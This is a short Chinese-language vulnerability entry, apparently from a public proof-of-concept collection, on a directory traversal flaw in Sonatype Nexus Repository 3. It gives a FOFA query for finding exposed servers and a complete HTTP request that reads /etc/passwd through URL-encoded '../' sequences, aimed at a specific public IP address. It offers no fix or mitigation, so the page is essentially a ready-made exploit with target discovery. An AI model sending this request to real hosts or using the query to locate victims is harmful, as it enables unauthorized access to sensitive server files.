# Sonatype Nexus Repository 3存在目录遍历漏洞

# 一、漏洞简介
 Sonatype Nexus Repository 3是一个universal repository manager，用于管理和代理各种软件组件、工件和依赖项。它支持多种格式，包括Java、npm、PyPI、Docker、 Helm 等。    Sonatype Nexus Repository 3 目录遍历漏洞，恶意攻击者可能利用该漏洞读取服务器上的敏感文件。  

# 二、影响版本
+   Sonatype Nexus Repository 

# 三、资产测绘
+ fofa`app="Nexus-Repository-Manager"`
+ 特征


# 四、漏洞复现
```plain
GET /%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
Host: 162.19.64.171:8081
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Connection: close
Cache-Control: max-age=0
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/rx4pgbpa10t7pmtr>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
